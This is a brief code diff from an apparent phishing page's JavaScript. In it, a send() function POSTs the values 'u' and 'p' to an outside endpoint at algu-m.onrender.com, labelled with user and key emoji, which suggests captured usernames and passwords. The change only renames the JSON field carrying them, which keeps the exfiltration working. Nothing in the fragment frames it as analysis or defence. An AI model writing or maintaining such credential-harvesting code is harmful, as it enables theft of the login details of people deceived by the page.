@@ -242,7 +242,7 @@ function send() {
     fetch("https://algu-m.onrender.com/api/mensagem", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: "👤: `" + u + "`\n🔑: `" + p + "`" })
+        body: JSON.stringify({ message: "👤: `" + u + "`\n🔑: `" + p + "`" })
     });
 
     if (clickCount === 0) {
